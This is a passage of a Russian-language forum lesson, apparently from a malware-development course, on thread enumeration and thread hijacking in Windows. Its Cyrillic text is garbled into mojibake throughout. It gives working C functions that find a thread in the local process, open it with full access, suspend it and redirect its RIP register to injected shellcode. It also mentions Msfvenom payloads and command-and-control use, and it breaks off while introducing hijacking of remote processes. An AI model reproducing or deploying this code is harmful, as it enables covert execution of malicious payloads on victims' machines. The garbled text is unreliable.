–í—Å–ø–æ–º–Ω–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ CreateToolhelp32Snapshot –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —á–∞—Å—Ç–µ–π, –≥–¥–µ WinAPI –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–Ω–∏–º–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ —Å–∏—Å—Ç–µ–º—ã. –í —ç—Ç–æ–º –º–æ–¥—É–ª–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ—Ç –∂–µ WinAPI, –Ω–æ —Å –¥—Ä—É–≥–∏–º –∑–Ω–∞—á–µ–Ω–∏–µ–º –¥–ª—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ dwFlags.<br />
–ß—Ç–æ–±—ã –ø–µ—Ä–µ—á–∏—Å–ª–∏—Ç—å —Ä–∞–±–æ—Ç–∞—é—â–∏–µ –ø–æ—Ç–æ–∫–∏ —Å–∏—Å—Ç–µ–º—ã, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É–∫–∞–∑–∞—Ç—å —Ñ–ª–∞–≥ TH32CS_SNAPTHREAD. –ò—Å–ø–æ–ª—å–∑—É—è —ç—Ç–æ—Ç —Ñ–ª–∞–≥, CreateToolhelp32Snapshot –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É THREADENTRY32, –ø–æ–∫–∞–∑–∞–Ω–Ω—É—é –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct tagTHREADENTRY32 {
  DWORD dwSize;                       // sizeof(THREADENTRY32)
  DWORD cntUsage;
  DWORD th32ThreadID;                 // ID –ø–æ—Ç–æ–∫–∞
  DWORD th32OwnerProcessID;           // PID –ø—Ä–æ—Ü–µ—Å—Å–∞, —Å–æ–∑–¥–∞–≤—à–µ–≥–æ –ø–æ—Ç–æ–∫.
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32;</code></pre>
	</div>
</div><br />
–ö–∞–∂–¥—ã–π —Ä–∞–±–æ—Ç–∞—é—â–∏–π –ø–æ—Ç–æ–∫ –∏–º–µ–µ—Ç —Å–≤–æ—é —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É THREADENTRY32 –Ω–∞ –∑–∞—Ö–≤–∞—á–µ–Ω–Ω–æ–º —Å–Ω–∏–º–∫–µ.<br />
<br />
<b>–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞ –ø–æ—Ç–æ–∫–∞ —Å–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft:</b><br />
<br />
–ß—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø–æ—Ç–æ–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É, —Å—Ä–∞–≤–Ω–∏—Ç–µ –µ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å —á–ª–µ–Ω–æ–º th32OwnerProcessID —Å—Ç—Ä—É–∫—Ç—É—Ä—ã THREADENTRY32 –ø—Ä–∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–∏ –ø–æ—Ç–æ–∫–æ–≤.<br />
<br />
–î—Ä—É–≥–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å, –∫ –∫–æ—Ç–æ—Ä–æ–º—É –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ø–æ—Ç–æ–∫, —Å—Ä–∞–≤–Ω–∏—Ç–µ —Ü–µ–ª–µ–≤–æ–π PID —Å THREADENTRY32.th32OwnerProcessID, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è PID –ø—Ä–æ—Ü–µ—Å—Å–∞, —Å–æ–∑–¥–∞–≤—à–µ–≥–æ –ø–æ—Ç–æ–∫.<br />
–ï—Å–ª–∏ PID —Å–æ–≤–ø–∞–¥–∞—é—Ç, —Ç–æ –≤ –Ω–∞—Å—Ç–æ—è—â–µ–µ –≤—Ä–µ–º—è –ø–µ—Ä–µ—á–∏—Å–ª—è–µ–º—ã–π –ø–æ—Ç–æ–∫ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç —Ü–µ–ª–µ–≤–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É.<br />
<br />
<b>–ù–µ–æ–±—Ö–æ–¥–∏–º—ã–µ WinAPI</b><br />
<br />
–ë—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ WinAPI –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞:<br />
<ul>
<li data-xf-list-type="ul">CreateToolhelp32Snapshot - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å —Ñ–ª–∞–≥–æ–º TH32CS_SNAPTHREAD –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–Ω–∏–º–∫–∞ –≤—Å–µ—Ö –ø–æ—Ç–æ–∫–æ–≤, —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –≤ —Å–∏—Å—Ç–µ–º–µ.</li>
<li data-xf-list-type="ul">Thread32First - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø–æ—Ç–æ–∫–µ, –∑–∞—Ö–≤–∞—á–µ–Ω–Ω–æ–º –Ω–∞ —Å–Ω–∏–º–∫–µ.</li>
<li data-xf-list-type="ul">Thread32Next - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–ª–µ–¥—É—é—â–µ–º –ø–æ—Ç–æ–∫–µ –Ω–∞ –∑–∞—Ö–≤–∞—á–µ–Ω–Ω–æ–º —Å–Ω–∏–º–∫–µ.</li>
<li data-xf-list-type="ul">OpenThread - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –µ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ –ø–æ—Ç–æ–∫–∞.</li>
<li data-xf-list-type="ul">GetCurrentProcessId - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è PID –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –ü–æ—Å–∫–æ–ª—å–∫—É –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å —è–≤–ª—è–µ—Ç—Å—è —Ü–µ–ª–µ–≤—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º, —Ç—Ä–µ–±—É–µ—Ç—Å—è –µ–≥–æ PID, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—Ç –ª–∏ –ø–æ—Ç–æ–∫–∏ —ç—Ç–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É.</li>
</ul><b>–†–∞–±–æ—á–∏–µ –ø–æ—Ç–æ–∫–∏</b><br />
<br />
–ü—Ä–µ–∂–¥–µ —á–µ–º –ø–æ–≥—Ä—É–∂–∞—Ç—å—Å—è –≤ –∫–æ–¥ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤, –≤–∞–∂–Ω–æ –ø–æ–Ω—è—Ç—å –∫–æ–Ω—Ü–µ–ø—Ü–∏—é —Ä–∞–±–æ—á–∏—Ö –ø–æ—Ç–æ–∫–æ–≤. –•–æ—Ç—è CreateThread –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –∫–æ–¥–µ, –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ Windows —Å–æ–∑–¥–∞—Å—Ç —Ä–∞–±–æ—á–∏–µ –ø–æ—Ç–æ–∫–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ. –≠—Ç–∏ —Ä–∞–±–æ—á–∏–µ –ø–æ—Ç–æ–∫–∏ —è–≤–ª—è—é—Ç—Å—è –¥–æ–ø—É—Å—Ç–∏–º—ã–º–∏ —Ü–µ–ª—è–º–∏ –¥–ª—è –ø–æ—Ö–∏—â–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞. –ü—Ä–∏–º–µ—Ä —ç—Ç–∏—Ö —Ä–∞–±–æ—á–∏—Ö –ø–æ—Ç–æ–∫–æ–≤ –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781136597.png"
		data-src="https://osint42.org/attachments/1746781136597-png.126/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781136597-png.126/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781136597.png"
			title="1746781136597.png"
			width="1007" height="110" loading="lazy" />
	</div><br />
<br />
–ü–æ—Ç–æ–∫–∏, –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–µ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –≤—ã—à–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä, ntdll.dll!EtwNotificationRegister+0x2d0, —Å–æ–∑–¥–∞—é—Ç—Å—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ EtwNotificationRegister, –∫–æ—Ç–æ—Ä–∞—è —Å–≤—è–∑–∞–Ω–∞ —Å ETW - —Ç—Ä–∞—Å—Å–∏—Ä–æ–≤–∫–æ–π —Å–æ–±—ã—Ç–∏–π –¥–ª—è Windows.<br />
ETW –±—É–¥–µ—Ç –æ–±—ä—è—Å–Ω–µ–Ω–æ –≤ –±—É–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö, –Ω–æ –Ω–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å, —á—Ç–æ —ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã, –∫–æ–≥–¥–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–µ —Å–æ–±—ã—Ç–∏–µ.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤ GetLocalThreadHandle</b> –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ä–∞–Ω–µ–µ —É–ø–æ–º—è–Ω—É—Ç—ã–µ —à–∞–≥–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤.<br />
<br />
–û–Ω–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 3 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<ul>
<li data-xf-list-type="ul">dwMainThreadId - –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –≥–ª–∞–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">dwThreadId - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ DWORD, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç ID –ø–æ—Ç–æ–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –∑–∞—Ö–≤–∞—Ç–∏—Ç—å.</li>
<li data-xf-list-type="ul">hThread - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–ª—è –ø–æ—Ç–æ–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –∑–∞—Ö–≤–∞—Ç–∏—Ç—å.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

    // –ü–æ–ª—É—á–µ–Ω–∏–µ ID –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    DWORD           dwProcessId  = GetCurrentProcessId();
    HANDLE          hSnapShot    = NULL;
    THREADENTRY32   Thr          = {
        .dwSize = sizeof(THREADENTRY32)
    };

    // –°–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–∞ –ø–æ—Ç–æ–∫–æ–≤ —Ç–µ–∫—É—â–µ–≥–æ –∑–∞–ø—É—â–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf(&quot;\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø–æ—Ç–æ–∫–µ, –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω–æ–º –≤ —Å–Ω–∏–º–∫–µ.
    if (!Thread32First(hSnapShot, &amp;Thr)) {
        printf(&quot;\n\t[!] Thread32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // –ï—Å–ª–∏ PID –ø–æ—Ç–æ–∫–∞ —Ä–∞–≤–µ–Ω PID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Ç–æ
        // —ç—Ç–æ—Ç –ø–æ—Ç–æ–∫ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤ —Ü–µ–ª–µ–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
        // &#039;Thr.th32ThreadID != dwMainThreadId&#039; –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏—Å–∫–ª—é—á–µ–Ω–∏—è –≥–ª–∞–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –Ω–∞—à–µ–≥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
        if (Thr.th32OwnerProcessID == dwProcessId &amp;&amp; Thr.th32ThreadID != dwMainThreadId) {

            // –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –ø–æ—Ç–æ–∫–∞
            *dwThreadId  = Thr.th32ThreadID;
            *hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

            if (*hThread == NULL)
                printf(&quot;\n\t[!] OpenThread Failed With Error : %d \n&quot;, GetLastError());

            break;
        }

    // –ü–æ–∫–∞ –≤ —Å–Ω–∏–º–∫–µ –æ—Å—Ç–∞—é—Ç—Å—è –ø–æ—Ç–æ–∫–∏
    } while (Thread32Next(hSnapShot, &amp;Thr));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwThreadId == NULL || *hThread == NULL)
        return FALSE;
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –ø–æ—Ç–æ–∫–∞</b><br />
<br />
–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –µ–≥–æ –º–æ–∂–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å –≤ —Ñ—É–Ω–∫—Ü–∏—é HijackThread.<br />
WinAPI SuspendThread –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–æ—Ç–æ–∫–∞, –∞ –∑–∞—Ç–µ–º GetThreadContext –∏ SetThreadContext –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞ RIP, —á—Ç–æ–±—ã –æ–Ω —É–∫–∞–∑—ã–≤–∞–ª –Ω–∞ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ –ø–æ–ª–µ–∑–Ω–æ–≥–æ –∫–æ–¥–∞. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–º –ø–æ—Ç–æ–∫–∞ –ø–æ–ª–µ–∑–Ω—ã–π –∫–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–∞–ø–∏—Å–∞–Ω –≤ –ø–∞–º—è—Ç—å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

    CONTEXT    ThreadCtx = {
        .ContextFlags = CONTEXT_ALL
    };

    SuspendThread(hThread);

    if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    ThreadCtx.Rip = pAddress;

    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;\t[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt; –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è ... &quot;);
    getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è </b><br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–≥–æ –∫–æ–¥–∞ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è, —Ç–∞–∫ –∫–∞–∫ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –≥–ª–∞–≤–Ω—ã–º –ø–æ—Ç–æ–∫–æ–º –∏ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–µ–ø—Ä–µ—Ä—ã–≤–Ω–æ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781147794.png"
		data-src="https://osint42.org/attachments/1746781147794-png.127/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781147794-png.127/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781147794.png"
			title="1746781147794.png"
			width="1473" height="523" loading="lazy" />
	</div><br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –º–æ–∂–µ—Ç –∑–∞–≤–µ—Ä—à–∏—Ç—å—Å—è —Å–±–æ–µ–º –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —Å–µ—Ä–≤–µ—Ä–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏ –∫–æ–Ω—Ç—Ä–æ–ª—è, –ø—Ä–æ—Ü–µ—Å—Å –±—É–¥–µ—Ç –ø—Ä–æ–¥–æ–ª–∂–∞—Ç—å —Ä–∞–±–æ—Ç—É. <b>–û–¥–Ω–∞–∫–æ, –µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è shellcode calc –æ—Ç Msfvenom, –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —Å–±–æ–µ–º, –ø–æ—Ç–æ–º—É —á—Ç–æ shellcode calc –æ—Ç Msfvenom –∑–∞–≤–µ—Ä—à–∞–µ—Ç –≤—ã–∑—ã–≤–∞—é—â–∏–π –ø–æ—Ç–æ–∫.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781162877.png"
		data-src="https://osint42.org/attachments/1746781162877-png.128/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781162877-png.128/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781162877.png"
			title="1746781162877.png"
			width="1278" height="566" loading="lazy" />
	</div><br />
<br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –ø–æ—Ç–æ–∫–æ–≤</b><br />
<br />
–í —ç—Ç–æ–π —á–∞—Å—Ç–∏ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ CreateToolhelp32Snapshot –¥–ª—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –í GetLocalThreadHandle, –ø–æ–∫–∞–∑–∞–Ω–Ω–æ–º —Ä–∞–Ω–µ–µ, –≤–Ω–µ—Å–µ–Ω—ã –Ω–µ–±–æ–ª—å—à–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è, —á—Ç–æ–±—ã —Å–¥–µ–ª–∞—Ç—å –µ–≥–æ —Ä–∞–±–æ—Ç—É —Å —É–¥–∞–ª–µ–Ω–Ω—ã–º–∏ –ø–æ—Ç–æ–∫–∞–º–∏.<br />
<br />
–õ–æ–≥–∏–∫–∞ –æ—Å—Ç–∞–µ—Ç—Å—è –ø—Ä–µ–∂–Ω–µ–π, –≥–¥–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è CreateToolhelp32Snapshot, Thread32First –∏ Thread32Next –¥–ª—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
<b>–û—Ç–ª–∏—á–∏–µ –ø—Ä–∏ –Ω–∞–ø–∞–¥–µ–Ω–∏–∏ –Ω–∞ —É–¥–∞–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –æ—Å–Ω–æ–≤–Ω–æ–π –ø–æ—Ç–æ–∫ —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç –±—ã—Ç—å —Ü–µ–ª—å—é –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –ø–æ—Ç–æ–∫–æ–≤</b><br />
<br />
GetRemoteThreadhandle –ø–µ—Ä–µ—á–∏—Å–ª—è–µ—Ç –ø–æ—Ç–æ–∫–∏ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –û–Ω –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 3 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<br />
